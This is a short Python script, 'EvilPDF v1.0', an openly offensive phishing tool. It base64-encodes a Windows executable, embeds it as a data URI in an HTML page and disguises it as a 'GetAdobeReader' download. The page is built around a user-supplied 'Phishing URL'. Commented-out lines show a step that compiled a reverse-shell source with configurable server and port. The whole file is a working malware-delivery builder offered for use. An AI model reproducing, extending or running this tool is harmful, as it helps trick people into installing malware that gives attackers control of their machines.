#! /usr/bin/env python3
# EvilPDF v1.0
# coded by: l0c0b0b0

import os, time, sys


def payload(payload_name, url):
    print( "Building malware binary")
    time.sleep(2)
    #os.system("sed 's+payload_port+'%s'+g' source.c | sed 's+payload_server+'%s'+g' > rs.c" % (payload_port,payload_server))
    #os.system("i686-w64-mingw32-gcc source.c -o %s" % payload_name)
    #os.system("rm -rf rs.c")
    print ("Converting malware binary to base64")
    time.sleep(2)
    #os.system('base64 -w 0 %s > payload_b64' % (payload_name))
    os.system('base64 -w 0 PDFReader.EXE > payload_b64')

    with open ("payload_b64", 'r') as get_b64:
        data=get_b64.read().strip()

    print( "Injecting Data URI (base64) code into page.html")
    time.sleep(2)
    os.system("sed 's+url_website+'%s'+g' template.html | sed 's+payload_name.zip+'%s'+g'  > page.html" % (url,os.path.basename(payload_name)))
    f = open("page.html", 'r')
    filedata = f.read()
    f.close()
    newdata = filedata.replace("data_base64", "%s" % (data))

    f=open("page.html", 'w')
    f.write(newdata)
    f.close()

def main():
    name_default="GetAdobeReader"
    payload_name=input('Exe file name (Default => %s): ' % (name_default))
    if payload_name == "":
        payload_name=name_default+".exe"
    else:
        payload_name=payload_name+".exe"

    url_default="https://get.adobe.com/flashplayer/"
    url=input('Phishing URL (Default => %s): ' % (url_default))
    if url == "":
        url=url_default

    payload(payload_name, url)

if __name__ == '__main__':
    main()
